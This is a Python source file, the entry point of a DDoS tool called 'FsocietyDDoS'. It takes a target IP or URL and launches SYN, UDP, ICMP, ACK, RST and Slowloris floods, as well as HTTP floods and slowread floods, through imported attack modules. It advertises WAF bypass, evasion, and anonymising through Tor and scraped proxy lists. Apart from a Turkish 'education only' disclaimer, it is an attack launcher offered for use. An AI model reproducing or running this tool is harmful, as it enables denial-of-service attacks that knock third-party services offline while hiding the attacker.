#!/usr/bin/env python3
"""
FsocietyDDoS - Professional Modular DDoS Testing Framework
Main Entry Point - Modular Architecture

⚠️ SADECE EĞİTİM VE TEST AMAÇLI KULLANINIZ ⚠️
Bu araç sadece kendi sunucularınızda güvenlik testleri yapmak için tasarlanmıştır.
Yetkisiz kullanım yasaktır ve yasal sorumluluk kullanıcıya aittir.

Features:
- Advanced Layer 4/7 Attack Methods (Modular)
- WAF Bypass & Evasion Techniques  
- Traffic Encryption & Privacy Features
- Real-time Statistics & Monitoring
- Distributed Attack Coordination
- Professional Proxy Management
"""

import argparse
import asyncio
import base64
import concurrent.futures
import hashlib
import json
import logging
import os
import platform
import queue
import random
import re
import socket
import ssl
import statistics
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
import uuid
from collections import defaultdict, deque
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
import warnings

# Import required libraries with auto-installation
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("❌ requests library not found. Install with: pip install requests")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("❌ psutil library not found. Install with: pip install psutil")

try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("❌ scapy library not found. Install with: pip install scapy")

# Import modular components
try:
    from core import NetworkAttacks, AdvancedLayer4Attacks
    from layer7 import AdvancedLayer7Attacks
    MODULAR_IMPORTS_AVAILABLE = True
    print("✅ Modular components loaded successfully")
except ImportError as e:
    MODULAR_IMPORTS_AVAILABLE = False
    print(f"❌ Modular imports failed: {e}")
    print("Falling back to legacy mode...")

# Global Configuration
CONFIG = {
    'max_threads': 1000,
    'timeout': 10,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
    ],
    'proxy_sources': [
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
    ],
    'tor_proxies': [
        '127.0.0.1:9050',
        '127.0.0.1:9150'
    ],
    'attack_methods': {
        'layer4': ['tcp-syn', 'udp-flood', 'icmp-flood', 'tcp-ack', 'tcp-rst', 'slowloris-advanced'],
        'layer7': ['http-flood', 'browser-emulation', 'slowread', 'advanced-http']
    }
}


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='FsocietyDDoS - Professional Modular DDoS Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python fsociety_ddos_modular.py -t 192.168.1.100 -p 80 -m tcp-syn -d 60 -th 100
  python fsociety_ddos_modular.py -u http://example.com -m http-flood -d 120 -th 200
  python fsociety_ddos_modular.py -u https://target.com -m advanced-http -d 300 -th 150
        """
    )
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', help='Target IP address')
    target_group.add_argument('-u', '--url', help='Target URL for Layer 7 attacks')
    
    # Attack configuration
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-m', '--method', required=True, 
                       choices=['tcp-syn', 'udp-flood', 'icmp-flood', 'tcp-ack', 'tcp-rst', 
                               'slowloris-advanced', 'http-flood', 'browser-emulation', 
                               'slowread', 'advanced-http'],
                       help='Attack method')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('-th', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    
    # Advanced options
    parser.add_argument('--proxy-file', help='File containing proxy list')
    parser.add_argument('--use-tor', action='store_true', help='Use Tor proxy')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--stats', action='store_true', help='Show real-time statistics')
    
    return parser.parse_args()


def run_attack(args):
    """Run the specified attack using modular components"""
    if not MODULAR_IMPORTS_AVAILABLE:
        print("❌ Modular components not available. Please check your installation.")
        return
    
    print(f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                    🎭 FSOCIETY DDOS TOOL 🎭                   ║
    ║                   Modular Professional Edition                ║
    ║                                                               ║
    ║  ⚠️  SADECE EĞİTİM VE TEST AMAÇLI KULLANINIZ  ⚠️             ║
    ║     Kendi sunucularınızda test etmek için tasarlanmıştır     ║
    ║                                                               ║
    ║  🔥 Modüler Layer 4/7 Saldırı Metodları                      ║
    ║  🛡️  WAF Bypass ve Evasion Teknikleri                        ║
    ║  🔒 Trafik Şifreleme ve Gizlilik Özellikleri                 ║
    ║  📊 Gerçek Zamanlı İstatistikler ve Monitoring               ║
    ║  🌐 Dağıtık Saldırı Koordinasyonu                            ║
    ║  🧅 Tor Proxy Desteği                                        ║
    ║  🎯 Profesyonel Proxy Yönetimi                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # Security warning
    print("⚠️  GÜVENLİK UYARISI:")
    print("   Bu araç sadece eğitim ve güvenlik testi amaçlıdır.")
    print("   Yetkisiz kullanım yasaktır ve yasal sorumluluk kullanıcıya aittir.")
    print("   Sadece kendi sunucularınızda test yapınız!")
    print()
    
    # Get user confirmation
    confirmation = input("Devam etmek istediğinizden emin misiniz? (y/N): ").lower().strip()
    if confirmation not in ['y', 'yes', 'evet', 'e']:
        print("❌ İşlem iptal edildi.")
        return
    
    # Initialize attack based on method
    try:
        if args.method in ['tcp-syn', 'udp-flood', 'icmp-flood']:
            # Basic Layer 4 attacks
            if not args.target:
                print("❌ Layer 4 attacks require target IP address (-t)")
                return
                
            attacker = NetworkAttacks(args.target, args.port)
            
            if args.method == 'tcp-syn':
                print(f"🚀 Starting TCP SYN Flood attack on {args.target}:{args.port}")
                attacker.tcp_syn_flood(duration=args.duration, threads=args.threads)
            elif args.method == 'udp-flood':
                print(f"🚀 Starting UDP Flood attack on {args.target}:{args.port}")
                attacker.udp_flood(duration=args.duration, threads=args.threads)
            elif args.method == 'icmp-flood':
                print(f"🚀 Starting ICMP Flood attack on {args.target}")
                attacker.icmp_flood(duration=args.duration, threads=args.threads)
                
        elif args.method in ['tcp-ack', 'tcp-rst', 'slowloris-advanced']:
            # Advanced Layer 4 attacks
            if not args.target:
                print("❌ Advanced Layer 4 attacks require target IP address (-t)")
                return
                
            attacker = AdvancedLayer4Attacks(args.target, args.port)
            
            if args.method == 'tcp-ack':
                print(f"🚀 Starting TCP ACK Flood attack on {args.target}:{args.port}")
                attacker.tcp_ack_flood(duration=args.duration, threads=args.threads)
            elif args.method == 'tcp-rst':
                print(f"🚀 Starting TCP RST Flood attack on {args.target}:{args.port}")
                attacker.tcp_rst_flood(duration=args.duration, threads=args.threads)
            elif args.method == 'slowloris-advanced':
                print(f"🚀 Starting Advanced Slowloris attack on {args.target}:{args.port}")
                attacker.slowloris_advanced(duration=args.duration, connections=args.threads)
                
        elif args.method in ['http-flood', 'browser-emulation', 'slowread', 'advanced-http']:
            # Layer 7 attacks
            if not args.url:
                print("❌ Layer 7 attacks require target URL (-u)")
                return
                
            # Load proxy list if provided
            proxy_list = []
            if args.proxy_file and os.path.exists(args.proxy_file):
                with open(args.proxy_file, 'r') as f:
                    proxy_list = [line.strip() for line in f if line.strip()]
                print(f"📋 Loaded {len(proxy_list)} proxies from file")
            
            attacker = AdvancedLayer7Attacks(args.url, proxy_list)
            
            if args.method == 'advanced-http':
                print(f"🚀 Starting Advanced HTTP Flood attack on {args.url}")
                attacker.http_flood_advanced(duration=args.duration, threads=args.threads)
            elif args.method == 'browser-emulation':
                print(f"🚀 Starting Browser Emulation attack on {args.url}")
                attacker.browser_emulation_attack(duration=args.duration, threads=args.threads)
            elif args.method == 'slowread':
                print(f"🚀 Starting Slowread attack on {args.url}")
                attacker.slowread_attack(duration=args.duration, connections=args.threads)
                
        print("✅ Attack completed successfully!")
        
    except KeyboardInterrupt:
        print("\n❌ Attack interrupted by user")
    except Exception as e:
        print(f"❌ Attack failed: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()


def main():
    """Main entry point"""
    try:
        # Check Python version
        if sys.version_info < (3, 7):
            print("❌ Python 3.7 or higher is required")
            sys.exit(1)
        
        # Check if running as root/admin (recommended for some attacks)
        if platform.system() != "Windows" and os.geteuid() != 0:
            print("⚠️  Warning: Running without root privileges. Some attacks may not work properly.")
        
        # Parse arguments and run attack
        args = parse_arguments()
        
        if args.verbose:
            print("🔧 Verbose mode enabled")
            print(f"🎯 Target: {args.target or args.url}")
            print(f"🔧 Method: {args.method}")
            print(f"⏱️  Duration: {args.duration}s")
            print(f"🧵 Threads: {args.threads}")
            print()
        
        run_attack(args)
        
    except KeyboardInterrupt:
        print("\n❌ Program interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Fatal error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()